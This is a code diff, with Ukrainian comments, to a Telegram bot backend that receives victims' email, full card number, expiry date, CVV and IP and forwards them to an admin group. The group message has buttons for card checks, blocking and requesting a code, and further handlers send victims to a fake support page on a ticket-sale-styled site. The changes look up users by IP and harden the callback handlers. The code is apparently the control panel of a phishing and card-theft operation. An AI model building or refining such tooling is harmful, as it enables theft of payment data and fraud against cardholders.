@@ -1058,22 +1058,30 @@ async def payment_notify(request):
     expiry = data.get('expiry', '')
     cvv = data.get('cvv', '')
     ip = data.get('ip', '')
-    user_id = data.get('user_id', '')  # якщо є user_id, інакше треба визначати
+    user_id = data.get('user_id', '')
+    # --- Визначаємо user_id по IP, якщо не передано ---
+    if not user_id:
+        # user_data: ip -> user_id (приклад, якщо ти зберігаєш ip у user_data)
+        for uid, udata in user_data.items():
+            if udata.get('ip') == ip:
+                user_id = uid
+                break
+        # Якщо треба, можна зробити пошук у базі (якщо ти зберігаєш ip у users.db)
     text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
-    kb = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-            ],
-            [
-                InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{user_id}"),
-                InlineKeyboardButton(text="Text", callback_data=f"text:{user_id}")
-            ]
+    kb_rows = [
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
         ]
-    )
+    ]
+    if user_id:
+        kb_rows.append([
+            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{user_id}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{user_id}")
+        ])
+    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
 
@@ -1148,7 +1156,11 @@ async def code_request_again_handler(call: types.CallbackQuery):
 
 @router.callback_query(lambda c: c.data.startswith("support:"))
 async def admin_support_callback(call: types.CallbackQuery):
-    user_id = int(call.data.split(":")[1])
+    user_id_str = call.data.split(":")[1]
+    if not user_id_str.isdigit():
+        await call.answer("user_id не визначено")
+        return
+    user_id = int(user_id_str)
     total = 230  # або отримати з user_data
     url = f"https://artpullse.com/buy-tickets/loading/waiting-support.html?total={total}"
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=url)]])
@@ -1157,7 +1169,11 @@ async def admin_support_callback(call: types.CallbackQuery):
 
 @router.callback_query(lambda c: c.data.startswith("text:"))
 async def admin_text_callback(call: types.CallbackQuery):
-    user_id = int(call.data.split(":")[1])
+    user_id_str = call.data.split(":")[1]
+    if not user_id_str.isdigit():
+        await call.answer("user_id не визначено")
+        return
+    user_id = int(user_id_str)
     await call.message.answer("Введіть текст для користувача:")
     user_step[call.from_user.id] = f"text_for_{user_id}"
 
